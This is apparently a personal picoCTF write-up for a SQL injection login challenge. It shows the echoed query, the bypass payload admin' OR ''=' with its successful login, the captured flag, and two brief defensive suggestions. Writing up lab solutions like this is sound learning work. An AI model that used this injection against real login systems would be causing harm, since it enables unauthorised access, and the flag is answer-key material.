## Solution
Name is SQL based -> try to do a sql injection attack
* Has a username and passwod to type in to login
* Checked source code and nothing stands out

 When trying to log in using 

        username: hi
        password: passwod

I recieve this response 

        SQL query: SELECT * FROM users WHERE name='hi' AND password='passwod'

Gives me the SQL qurey 
>Need to change the SQL query so it can log in for me.  

Find out what to type into the login and password to login
After looking it up I need to add
>" OR 1=1' or another equaivalance

How to login

    USERNAME : admin' OR ''='
    PASSWORD: doesn't matter

I recieve this response

    SQL query  :SELECT * FROM users WHERE name='admin' OR ''='' AND password='there'  
    Login success 

In the source code of that page I found

## Flag

picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}

1. Two factor authenication 
2. Filter inputs to deny SQL commands in username and password
